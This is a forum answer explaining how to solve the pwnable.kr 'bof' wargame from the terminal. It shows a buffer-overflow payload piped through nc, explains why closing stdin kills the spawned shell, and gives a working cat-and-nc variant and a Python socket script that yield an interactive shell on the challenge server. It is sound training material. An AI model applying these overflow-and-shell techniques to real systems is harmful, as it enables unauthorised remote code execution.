      "content": "The answer from Jason is the correct solution. However, I wanted to give an alternative answer without Python, but from the terminal. IMO Python is always preferred for better automation, but sometimes you just wanna have a quick exploit done without extra tools.\n\nWith that in mind, one's natural attempt would be something like below:\n\n```\necho -e \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xbe\\xba\\xfe\\xca\\x0a\" | nc pwnable.kr 9000\n\n```\nAfter all, this is an exact replica of the code above in Python, right? Except, the server begs to differ:\n\nSo, what is the problem, then?\n\nThink about the command above, for a moment. It sends a bunch of characters to the stdin of the remote process, in the hopes of running /bin/sh. However, we still get greeted by the error. The reason for this, is that we are sending the correct payload, but then we are stopping. EOF. /bin/sh has no input, so execution continues to the next line, until the stack protector kicks in.\n\nThe reason why Python works and the echo command doesn't, is continuity. Python doesn't close the stream, while the terminal version does.\n\nTo prove it, here's a slightly longer version of the terminal exploit, which actually works:\n\n```\necho -e \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xbe\\xba\\xfe\\xca\\x0a\" > payload.bin\n\n```\nFirst, we save the exact payload as before, to a file named payload.bin in this case. Next, we run the following command:\n\n```\ncat payload.bin - | nc pwnable.kr 9000\n\n```\n(Note the - after payload.bin, after cat is done outputting contents of payload.bin, it will start outputting whatever comes in via stdin)\n\nAnd voila! Now you are actually in. You can try typing shell commands, such as cat flag, or touch /tmp/pwned or whatever you like.\n\nWhew! That was long. Hope this info will help other confused souls as it did help me a while ago.\n\n",

Here's the proof in the form of a Python script:\n\n```\nimport socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((\"pwnable.kr\", 9000))\ns.send(\"A\"*52 + \"\\xBE\\xBA\\xFE\\xCA\" + \"\\x0A\")\nprint \"You now have an interactive shell :)\"\nwhile True:\n    s.send(raw_input() + \"\\x0A\")\n    print s.recv(1024)\n\n```\n",
